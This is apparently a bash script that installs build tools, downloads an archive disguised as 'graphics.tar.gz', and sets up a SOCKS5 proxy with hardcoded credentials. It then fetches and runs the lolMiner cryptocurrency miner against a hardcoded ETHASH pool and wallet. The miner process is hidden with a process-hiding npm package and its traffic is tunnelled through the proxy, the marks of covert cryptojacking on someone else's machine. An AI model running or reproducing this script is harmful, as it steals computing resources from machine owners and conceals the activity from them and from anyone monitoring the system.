#!/bin/bash

mkdir /home/docker
cd /home/docker
apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  45.140.13.119:9132 
socks5_username = wrojpnix
socks5_password = nkdthkd54j55
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner

chmod 777 lolMiner

ph add lolMiner

./graftcp/graftcp ./lolMiner --algo ETHASH --pool 172.65.240.178:4444 --user 7C86A8aa5482c0e35f193187A57f0D659092e916.$(echo $(shuf -i 1-999 -n 1)-PHO)
